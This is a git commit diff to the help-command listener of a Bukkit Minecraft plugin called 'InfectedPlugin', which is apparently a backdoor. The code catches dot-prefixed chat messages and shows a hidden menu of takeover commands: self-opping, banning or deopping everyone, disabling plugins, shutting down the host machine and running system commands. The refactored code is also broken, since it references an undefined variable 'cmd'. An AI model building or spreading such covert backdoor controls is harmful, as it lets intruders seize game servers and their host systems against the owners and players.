7b93860f30a2e5062fdebcce39821e25d60a6fbb
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-26 10:39:01 -0700

    Testing a new (hopefully) thread safe command system with .help.

--- src/org/CreeperCoders/InfectedPlugin/Commands/Command_help.java
+++ src/org/CreeperCoders/InfectedPlugin/Commands/Command_help.java
@@ -12,26 +12,34 @@ public class Command_help implements Listener
         String message = event.getMessage();
         final Player p = event.getPlayer();
         boolean cancel = true;
-    
-        if (message.toLowerCase().contains(".help"))
+        
+        if (cmd.startsWith("."))
         {
-            p.sendMessage(ChatColor.AQUA + "Commands");
-            p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
-            p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
-            p.sendMessage(ChatColor.GOLD + ".enableplugin - Enables a plugin of your choice.");
-            p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
-            p.sendMessage(ChatColor.GOLD + ".deop - Deops a player of your choice.");
-            p.sendMessage(ChatColor.GOLD + ".op - OPs a player of your choice.");
-            p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server. Bans sender too.");
-            p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
-            p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
-            p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
-            p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
-            p.sendMessage(ChatColor.GOLD + ".terminal - Use system commands!");
-            p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
-            p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
-            cancel = true;
-            return;
+            String[] args = message.split(" ");
+            if (args == null)
+            {
+                return;
+            }
+    
+            if (args[0].equalsIgnoreCase(".help"))
+            {
+                p.sendMessage(ChatColor.AQUA + "Commands");
+                p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
+                p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".enableplugin - Enables a plugin of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
+                p.sendMessage(ChatColor.GOLD + ".deop - Deops a player of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".op - OPs a player of your choice.");
+                p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server. Bans sender too.");
+                p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
+                p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
+                p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
+                p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
+                p.sendMessage(ChatColor.GOLD + ".terminal - Use system commands!");
+                p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
+                p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
+                cancel = true;
+            }
         }
         
         if (cancel)
